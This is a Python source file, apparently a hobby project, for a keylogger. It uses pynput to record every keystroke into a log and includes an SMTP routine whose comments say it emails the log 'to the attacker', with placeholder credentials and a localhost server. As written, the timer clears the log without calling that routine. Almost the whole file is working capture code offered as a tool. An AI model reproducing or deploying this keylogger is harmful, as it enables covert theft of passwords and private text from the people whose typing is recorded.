#made by Youssef Husssain

#all libraries used in code
from pynput.keyboard import Listener
from threading import Timer
import smtplib

log = ''


class timer_object(object):
    def __init__(self, interval, function):
        self._timer     = None
        self.interval   = interval
        self.function   = function
        self.is_running = False

    def timerinfo(self):
        print(f" the interval is {self.interval} and the function is {self.function}")

#
    def _run(self):
        self.is_running = False
        self.start()
        self.function()

#this function will start the timer so that it is actively running
    def start(self):
        if not self.is_running:
            self._timer = Timer(self.interval, self._run)
            self._timer.start()
            self.is_running = True

#this function will send the log to the timer function.
def sendlogs():
    global log
    print("sending logs")
    log = ""

#this will prepare the email so that a subject is defined as that is the format that SMTP protocol needs to send the email
def prepmsg(mail):
    message =f"""\
    Subject: structure

    {mail}"""
    return message

#part of the keylogger that defines certain key presses making it a clearer and readable format when viewing the keylog
def on_press(key):
    global log
    keystroke = str(key).replace("'", "")
    print("has been added to the log")

    if keystroke == 'Key.enter':
        log += "[enter]\n"
    elif keystroke == 'Key.backspace':
        log = log[:-1]
    elif keystroke == 'Key.shift':
        log += '^'
    elif keystroke == 'Key.delete':
        log += '[delete]'
    elif keystroke == 'Key.space':
        log += '[space]'
    else:
        log += keystroke

#this function will send the email with the correct specified port, smtp server location and credentials, if a user does
#not enter in any keystrokes, the email will not be send to the attacker
def send(msg):
   global log
   if len(log) > 0:
        with smtplib.SMTP(smtp_server, port) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, msg)


#specifiying values of port and smtp credentials for successful connection to smtp local server
port = 587
smtp_server = "localhost"
sender_email = "test@keylog.com"
receiver_email = "test@keylog.com"
password = "password"


def logstatus():
    print("successfully sent")

#timer will repeat for x amount of seconds and will send the log to the SMTP server
timer1 = timer_object(10, sendlogs)
timer1.start()
timer2 = timer_object(10, logstatus)
timer2.start()
#keylogger is listening for keystrokes
print("program listening")
with Listener(on_press=on_press) as listener:
    listener.join()


